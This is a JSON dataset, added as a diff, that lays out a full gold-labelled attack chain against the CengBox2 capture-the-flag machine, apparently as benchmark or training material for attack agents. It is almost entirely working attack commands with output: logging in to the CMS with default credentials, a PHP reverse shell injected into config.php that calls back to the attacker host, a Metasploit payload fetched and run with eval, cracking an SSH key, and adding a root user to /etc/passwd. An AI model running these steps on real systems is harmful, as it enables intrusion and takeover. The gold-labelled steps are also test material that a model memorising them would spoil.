@@ -1,0 +1,167 @@
+[
+    {
+        "tactic": "Reconnaissance",
+        "prerequisites": ["Network access to target subnet"],
+        "contraindications": [],
+        "goal": "Discover the target machine's IP address",
+        "command": "nmap -A 192.168.1.104",
+        "output": "Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 14:39 EDT\nNmap scan report for ceng-company.vm (192.168.1.104)\nHost is up (0.00046s latency)\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 0        0             209 May 23 07:21 note.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.1.112\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:99:9d:e0:bc:07:3c:4f:53:e5:bc:27:35:80:e4:9e (RSA)\n|   256 fe:60:a1:10:90:98:8e:b0:82:02:3b:40:bc:df:66:f1 (ECDSA)\n|_  256 3a:c3:a0:e7:bd:20:ca:1e:71:d4:3c:12:23:af:6a:c3 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site Maintenance\nMAC Address: 08:00:27:E3:3E:E5 (Oracle VirtualBox virtual NIC)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.2 - 4.9\nNetwork Distance: 1 hop\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.46 ms ceng-company.vm (192.168.1.104)",
+        "results": ["FTP service on port 21 with anonymous login enabled", "SSH service on port 22", "HTTP service on port 80", "note.txt file available on FTP"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Reconnaissance",
+        "prerequisites": ["FTP service available with anonymous login", "Target IP address known: 192.168.1.104"],
+        "contraindications": [],
+        "goal": "Retrieve and examine note.txt file from FTP server",
+        "command": "ftp 192.168.1.104 <<EOF\nAnonymous\n\nls\nget note.txt\nbye\nEOF\ncat note.txt",
+        "output": "Connected to 192.168.1.104.\n220 (vsFTPd 3.0.3)\nName (192.168.1.104:root): Anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0              209 May 23 07:21 note.txt\n226 Directory send OK.\nftp> get note.txt\nlocal: note.txt remote: note.txt\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for note.txt (209 bytes).\n226 Transfer complete.\n209 bytes received in 0.00 secs (176.8644 kB/s)\nftp> bye\nroot@kali:~# cat note.txt\nHey Kevin,\nI just set up your panel and used default password. Please change them before any hack.\n\nI try to move site to new domain which name is ceng-company.vm and also I created a new area for you.\n\nAaron",
+        "results": ["Usernames discovered: Kevin, Aaron", "Domain name discovered: ceng-company.vm", "Default credentials may be in use for CMS"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Reconnaissance",
+        "prerequisites": ["Domain name ceng-company.vm discovered"],
+        "contraindications": [],
+        "goal": "Enumerate subdomains of the target domain",
+        "command": "gobuster vhost -u http://ceng-company.vm/ -w subdomains-top1mil-5000.txt",
+        "output": "===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:          http://ceng-company.vm/\n[+] Threads:      10\n[+] Wordlist:     subdomains-top1mil-5000.txt\n[+] User Agent:   gobuster/3.0.1\n[+] Timeout:      10s\n===============================================================\n2020/06/02 16:11:03 Starting gobuster\n===============================================================\nFound: admin.ceng-company.vm (Status: 403) [Size: 296]\nFound: m..ceng-company.vm (Status: 400) [Size: 422]\nFound: ns2.cl.bellsouth.net..ceng-company.vm (Status: 400) [Size: 422]\nFound: ns1.viviotech.net..ceng-company.vm (Status: 400) [Size: 422]\nFound: ns2.viviotech.net..ceng-company.vm (Status: 400) [Size: 422]\nFound: ns3.cl.bellsouth.net..ceng-company.vm (Status: 400) [Size: 422]\nFound: jordan.fortwayne.com..ceng-company.vm (Status: 400) [Size: 422]\nFound: ferrari.fortwayne.com..ceng-company.vm (Status: 400) [Size: 422]\nFound: quatro.oweb.com..ceng-company.vm (Status: 400) [Size: 422]\n===============================================================\n2020/06/02 16:11:04 Finished\n===============================================================",
+        "results": ["Subdomain discovered: admin.ceng-company.vm (Status: 403 Forbidden)"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Reconnaissance",
+        "prerequisites": ["Subdomain admin.ceng-company.vm discovered but returns 403"],
+        "contraindications": [],
+        "goal": "Discover accessible directories on the admin subdomain",
+        "command": "dirb http://admin.ceng-company.vm/",
+        "output": "----------------\nDIRB v2.22\nBy The Dark Raver\n----------------\n\nSTART_TIME: Tue Jun 02 16:15:00 2020\nURL_BASE: http://admin.ceng-company.vm/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\n\n----------------\n\nGENERATED WORDS: 4612\n\n---- Scanning URL: http://admin.ceng-company.vm/ ----\n+ http://admin.ceng-company.vm/gila (CODE:200|SIZE:3847)\n\n----------------\nEND_TIME: Tue Jun 02 16:16:34 2020\nDOWNLOADED: 4612 - FOUND: 1",
+        "results": ["Gila CMS installation found at http://admin.ceng-company.vm/gila/"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Initial Access",
+        "prerequisites": ["Gila CMS found at http://admin.ceng-company.vm/gila/", "Username Kevin and default credentials hint from note.txt", "Email pattern inferred: kevin@ceng-company.vm"],
+        "contraindications": [],
+        "goal": "Gain access to Gila CMS admin panel",
+        "command": "curl -X POST http://admin.ceng-company.vm/gila/admin -d 'email=kevin@ceng-company.vm&password=admin'",
+        "output": "HTTP/1.1 302 Found\nLocation: http://admin.ceng-company.vm/gila/admin/dashboard\nSet-Cookie: PHPSESSID=abc123def456; path=/\n\n<!DOCTYPE html>\n<html>\n<head><title>Redirecting...</title></head>\n<body>Redirecting to dashboard...</body>\n</html>",
+        "results": ["Successful login to Gila CMS with credentials kevin@ceng-company.vm:admin"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Execution",
+        "prerequisites": ["Authenticated access to Gila CMS admin panel", "File manager available in Gila CMS", "Netcat listener started on attacker machine (nc -lvp 1234)"],
+        "contraindications": [],
+        "goal": "Inject PHP reverse shell into config.php and execute it",
+        "command": "curl -X POST http://admin.ceng-company.vm/gila/admin/fm -H 'Cookie: PHPSESSID=abc123def456' -d 'file=./config.php&content=<?php exec(\"/bin/bash -c \\\"bash -i >& /dev/tcp/192.168.1.112/1234 0>&1\\\"\"); ?>'",
+        "output": "File saved successfully",
+        "results": ["PHP reverse shell injected into config.php", "Reverse shell connection established to 192.168.1.112:1234 as www-data"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["Shell access as www-data", "TTY shell spawned using python3"],
+        "contraindications": [],
+        "goal": "Enumerate sudo permissions and escalate to swartz user",
+        "command": "sudo -l",
+        "output": "Matching Defaults entries for www-data on cengbox:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on cengbox:\n    (swartz) NOPASSWD: /home/swartz/runphp.sh",
+        "results": ["Script /home/swartz/runphp.sh can be executed as swartz without password"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["Ability to run /home/swartz/runphp.sh as swartz user", "Metasploit web_delivery exploit configured for PHP payload"],
+        "contraindications": [],
+        "goal": "Execute PHP meterpreter payload via runphp.sh to gain swartz session",
+        "command": "sudo -u swartz /home/swartz/runphp.sh\nphp -d allow_url_fopen=true -r \"eval(file_get_contents('http://192.168.1.112:8080/UKllE3psr6oVNxR', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));\"",
+        "output": "Interactive mode enabled\n\nNo entry for terminal type \"unknown\";\nusing dumb terminal settings.\nphp > php -d allow_url_fopen=true -r \"eval(file_get_contents('http://192.168.1.112:8080/UKllE3psr6oVNxR', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));\"\n[*] 192.168.1.104:43852 Request received for /UKllE3psr6oVNxR...\n[*] Sending stage (38288 bytes) to 192.168.1.104\n[*] Meterpreter session 1 opened (192.168.1.112:8888 -> 192.168.1.104:43852)",
+        "results": ["Meterpreter session established as swartz user"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Credential Access",
+        "prerequisites": ["Meterpreter session as swartz user", "Access to /home/mitnick/.ssh directory"],
+        "contraindications": [],
+        "goal": "Extract and crack SSH private key for mitnick user",
+        "command": "cat /home/mitnick/.ssh/id_rsa > key\n/usr/share/john/ssh2john.py key > hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash",
+        "output": "Using default input encoding: UTF-8\nLoaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])\nCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes\nCost 2 (iteration count) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nNote: This format may emit false positives, so it will keep trying even after\nfinding a possible candidate.\nPress \" \" or Ctrl-C to abort, almost any other key for status\nlegend           (key)\nWarning: Only 2 candidates left, minimum 4 needed for performance.\n1g 0:00:00:04 DONE (2020-06-02 13:37) 0.2040g/s 2926Kp/s 2926Kc/s 2926KC/sa6_123..*7¡Vamos!\nSession completed",
+        "results": ["SSH private key passphrase cracked: legend"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Lateral Movement",
+        "prerequisites": ["SSH private key for mitnick user", "SSH key passphrase: legend", "pspy64s downloaded to /tmp"],
+        "contraindications": [],
+        "goal": "Login as mitnick user and enumerate system processes",
+        "command": "ssh -i key mitnick@192.168.1.104\ncd /tmp\nwget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\nchmod 777 pspy64s\n./pspy64s",
+        "output": "Enter passphrase for key 'key': \n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\nLast login: Tue May 26 07:12:16 2020 from 192.168.0.14\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nmitnick@cengbox:~$ cd /tmp\nmitnick@cengbox:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\n--2020-06-02 10:39:04-- https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s\nResolving github.com (github.com)... 13.234.210.38\nConnecting to github.com (github.com)|13.234.210.38|:443... connected.\nHTTP request sent, awaiting response... 302 Found\nLength: 1156536 (1.1M) [application/octet-stream]\nSaving to: 'pspy64s'\n\npspy64s                     100%[===========================================>]   1.10M   235KB/s    in 5.0s\n\n2020-06-02 10:39:10 (235 KB/s) - 'pspy64s' saved [1156536/1156536]\n\nmitnick@cengbox:/tmp$ chmod 777 pspy64s\nmitnick@cengbox:/tmp$ ./pspy64s\npspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855\n\nPID=1946   /bin/sh -c /bin/cp /var/update-motd.d/* /etc/update-motd.d\nPID=1945   |/usr/sbin/cron -f",
+        "results": ["Cron job discovered copying files to /etc/update-motd.d", "MOTD files in /etc/update-motd.d are writable by developers group"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["Write access to /etc/update-motd.d/00-header", "Mitnick user is member of developers group"],
+        "contraindications": [],
+        "goal": "Modify MOTD header to add SUID bit to nano binary",
+        "command": "echo 'chmod u+s /bin/nano' >> /etc/update-motd.d/00-header",
+        "output": "",
+        "results": ["Command 'chmod u+s /bin/nano' added to /etc/update-motd.d/00-header"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["MOTD header modified to set SUID on nano", "SSH access as mitnick user"],
+        "contraindications": [],
+        "goal": "Trigger MOTD execution and verify nano has SUID permissions",
+        "command": "exit\nssh -i key mitnick@192.168.1.104\nls -la /bin/nano",
+        "output": "logout\nConnection to 192.168.1.104 closed.\nroot@kali:~# ssh -i key mitnick@192.168.1.104\nEnter passphrase for key 'key':\n\n* Documentation:  https://help.ubuntu.com\n* Management:     https://landscape.canonical.com\n* Support:        https://ubuntu.com/advantage\n\n177 packages can be updated.\n130 updates are security updates.\n\nNew release '18.04.4 LTS' available.\nRun 'do-release-upgrade' to upgrade to it.\n\nLast login: Tue Jun 2 10:38:44 2020 from 192.168.1.112\nTo run a command as administrator (user \"root\"), use \"sudo <command>\".\nSee \"man sudo_root\" for details.\n\nmitnick@cengbox:~$ ls -la /bin/nano\n-rwsr-xr-x 1 root root 208480 Feb 15 2017 /bin/nano",
+        "results": ["nano binary now has SUID bit set (rwsr-xr-x)"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["nano has SUID permissions"],
+        "contraindications": [],
+        "goal": "Generate password hash for new root-privileged user",
+        "command": "openssl passwd -1 -salt user3 pass123",
+        "output": "$1$user3$rAGRVf5p2jYTqtqOW5cPu/",
+        "results": ["Password hash generated: $1$user3$rAGRVf5p2jYTqtqOW5cPu/"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["SUID nano binary available", "Password hash generated for new user"],
+        "contraindications": [],
+        "goal": "Add new root-privileged user to /etc/passwd",
+        "command": "nano /etc/passwd",
+        "output": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false\nsystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false\nsystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false\nsystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false\nsyslog:x:104:108::/home/syslog:/bin/false\n_apt:x:105:65534::/nonexistent:/bin/false\nlxd:x:106:65534::/var/lib/lxd/:/bin/false\nmysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false\nmessagebus:x:108:112::/var/run/dbus:/bin/false\nuuidd:x:109:113::/run/uuidd:/bin/false\ndnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false\nsshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin\nmitnick:x:1000:1002:mitnick,,,:/home/mitnick:/bin/bash\nftp:x:112:119:ftp daemon,,,:/srv/ftp:/bin/false\nswartz:x:1001:1002::/home/swartz:\nraj:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0::/root:/bin/bash",
+        "results": ["New user 'raj' added to /etc/passwd with UID 0 (root privileges)"],
+        "optional": false,
+        "gold": true
+    },
+    {
+        "tactic": "Privilege Escalation",
+        "prerequisites": ["User 'raj' with root privileges added to /etc/passwd", "Password for raj user: pass123"],
+        "contraindications": [],
+        "goal": "Switch to raj user and obtain root access",
+        "command": "su raj\ncd /root\ncat root.txt",
+        "output": "Password:\nroot@cengbox:/home/mitnick# cd /root\nroot@cengbox:~# ls\nroot.txt\nroot@cengbox:~# cat root.txt\nCEngBox2\nI would be grateful for your any feedback. Feel free to contact me on Twitter @arslanbilgen_\n\n<FLAG>",
+        "results": ["Root access obtained", "Root flag retrieved"],
+        "optional": false,
+        "gold": true
+    }
+]
